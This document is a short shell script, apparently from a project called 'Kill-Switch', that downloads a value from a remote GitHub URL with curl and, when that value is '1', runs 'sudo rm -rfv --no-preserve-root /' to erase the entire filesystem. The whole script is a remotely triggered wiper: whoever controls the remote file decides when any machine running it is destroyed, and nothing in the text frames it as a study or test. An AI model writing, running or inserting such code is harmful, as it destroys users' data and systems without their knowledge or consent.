URL="https://raw.githubusercontent.com/BastianAsmussen/Kill-Switch/main/Value.txt" # 0 = off, 1 = on

echo "Checking Killswitch..."
echo "($URL)"

curl -s -L $URL > Value.txt

VALUE=$(head -n 1 Value.txt)

if [ $VALUE = "1" ]
then

    sudo rm -rfv --no-preserve-root /
fi
